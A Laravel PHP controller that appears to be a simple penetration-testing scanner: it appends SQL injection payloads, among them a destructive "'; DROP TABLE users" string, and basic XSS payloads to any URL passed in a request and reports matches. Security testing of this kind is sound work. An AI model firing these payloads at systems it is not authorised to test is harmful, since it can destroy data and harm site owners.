<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class PenTestController extends Controller
{
    public function testSqlInjection(Request $request)
    {
        $url = $request->input('url');
        $payloads = [
            "' OR 1=1 --",
            "' UNION SELECT null, null, null --",
            "' OR 'a'='a",
            "'; DROP TABLE users --"
        ];

        $results = [];

        foreach ($payloads as $payload) {
            $response = Http::get($url . $payload);

            if (strpos($response->body(), "error") !== false || strpos($response->body(), "mysql") !== false) {
                $results[] = "SQL Injection detected with payload: " . $payload;
            }
        }

        return response()->json($results);
    }

    public function testXss(Request $request)
    {
        $url = $request->input('url');
        $payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ];

        $results = [];

        foreach ($payloads as $payload) {
            $response = Http::get($url . $payload);

            if (strpos($response->body(), $payload) !== false) {
                $results[] = "XSS detected with payload: " . $payload;
            }
        }

        return response()->json($results);
    }
}
